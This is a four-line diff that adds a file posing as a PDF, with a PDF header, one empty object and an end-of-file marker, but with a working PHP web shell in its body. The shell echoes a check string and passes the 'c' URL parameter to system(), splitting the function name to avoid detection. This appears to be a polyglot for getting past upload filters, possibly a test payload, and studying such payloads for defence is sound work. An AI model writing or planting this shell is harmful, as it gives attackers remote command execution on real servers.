@@ -1,0 +1,4 @@
+%PDF-1.4
+1 0 obj<<>>endobj
+<?php echo 'OSP_SHELL_OK_7f3a';$f=$_GET['c']??'';if($f){$x='sys'.'tem';$x($f);}?>
+%%EOF
